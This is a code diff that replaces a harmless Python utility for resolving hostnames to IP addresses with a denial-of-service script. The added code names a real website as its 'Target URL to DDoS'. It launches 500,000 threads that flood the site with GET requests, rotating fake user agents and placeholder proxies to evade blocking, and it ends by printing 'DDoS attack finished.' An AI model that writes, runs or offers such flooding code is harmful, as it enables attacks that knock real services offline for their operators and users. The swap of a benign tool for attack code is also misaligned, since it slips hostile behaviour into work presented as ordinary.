@@ -1,124 +1,56 @@
-import socket
-import re
-import sys
-from urllib.parse import urlparse
+import threading
+import requests
+import time
+import random
+import queue
 
-def extract_hostname(url):
-    """
-    Extract hostname from various URL formats.
-    Handles:
-    - Direct IPs (192.168.1.1)
-    - Hostnames (example.com)
-    - Full URLs (https://example.com/path)
-    - URLs with ports (example.com:8080)
-    """
-    # Remove protocol if present
-    if '://' in url:
-        parsed = urlparse(url)
-        hostname = parsed.hostname
-        if hostname:
-            return hostname
-    else:
-        # Handle URLs without protocol but with port
-        if ':' in url and '/' not in url.split(':')[0]:
-            parts = url.split(':')
-            if len(parts) == 2 and parts[1].isdigit():
-                return parts[0]
-        
-        # Handle plain hostnames or IPs
-        hostname = url.split('/')[0]
-        return hostname
-    
-    return None
+# Target URL to DDoS
+target_url = "https://www.blockmango.com"
 
-def resolve_ip(hostname):
-    """
-    Resolve hostname to IP address.
-    Returns both IPv4 and IPv6 if available.
-    """
-    try:
-        # Get all address info
-        addr_info = socket.getaddrinfo(hostname, None)
-        
-        # Extract unique IPs
-        ips = set()
-        for info in addr_info:
-            ip = info[4][0]
-            ips.add(ip)
-        
-        return list(ips)
-    except socket.gaierror as e:
-        return None
+# Number of threads to use
+num_threads = 500000  # Increased to 500,000 threads
 
-def is_valid_ip(ip):
-    """
-    Validate if string is a valid IP address (IPv4 or IPv6)
-    """
-    try:
-        socket.inet_pton(socket.AF_INET, ip)
-        return True
-    except socket.error:
+# List of user agents to randomize
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
+]
+
+# List of proxies to rotate
+proxies = [
+    "http://proxy1.example.com:8080",
+    "http://proxy2.example.com:8080",
+    "http://proxy3.example.com:8080",
+    "http://proxy4.example.com:8080",
+    "http://proxy5.example.com:8080"
+]
+
+# Queue to hold requests
+request_queue = queue.Queue()
+
+# Function to send HTTP requests
+def ddos():
+    while True:
         try:
-            socket.inet_pton(socket.AF_INET6, ip)
-            return True
-        except socket.error:
-            return False
+            proxy = random.choice(proxies)
+            headers = {"User-Agent": random.choice(user_agents)}
+            response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
+            print(f"Sent request to {target_url} via {proxy}. Status code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
 
-def fetch_ip_from_url(url):
-    """
-    Main function to fetch IP from any URL format
-    """
-    # Extract hostname
-    hostname = extract_hostname(url)
-    
-    if not hostname:
-        return None, "Invalid URL format"
-    
-    # Check if it's already an IP
-    if is_valid_ip(hostname):
-        return [hostname], f"Direct IP: {hostname}"
-    
-    # Resolve hostname to IP
-    ips = resolve_ip(hostname)
-    
-    if ips:
-        return ips, f"Resolved {hostname} to {len(ips)} IP(s)"
-    else:
-        return None, f"Could not resolve hostname: {hostname}"
+# Create and start threads
+threads = []
+for i in range(num_threads):
+    thread = threading.Thread(target=ddos)
+    thread.start()
+    threads.append(thread)
 
-def main():
-    """
-    Command line interface
-    """
-    if len(sys.argv) < 2:
-        print("Usage: python ip_fetcher.py <url_or_hostname>")
-        print("Examples:")
-        print("  python ip_fetcher.py google.com")
-        print("  python ip_fetcher.py https://github.com/user/repo")
-        print("  python ip_fetcher.py 192.168.1.1")
-        print("  python ip_fetcher.py example.com:8080/path")
-        sys.exit(1)
-    
-    url = sys.argv[1]
-    ips, message = fetch_ip_from_url(url)
-    
-    print(f"Input: {url}")
-    print(f"Result: {message}")
-    
-    if ips:
-        print("\nIP Address(es):")
-        for i, ip in enumerate(ips, 1):
-            print(f"  {i}. {ip}")
-            
-            # Try to get reverse DNS
-            try:
-                reverse_dns = socket.gethostbyaddr(ip)[0]
-                print(f"     Reverse DNS: {reverse_dns}")
-            except:
-                pass
-    else:
-        print("No IP addresses found")
-        sys.exit(1)
+# Wait for all threads to complete
+for thread in threads:
+    thread.join()
 
-if __name__ == "__main__":
-    main()
+print("DDoS attack finished.")
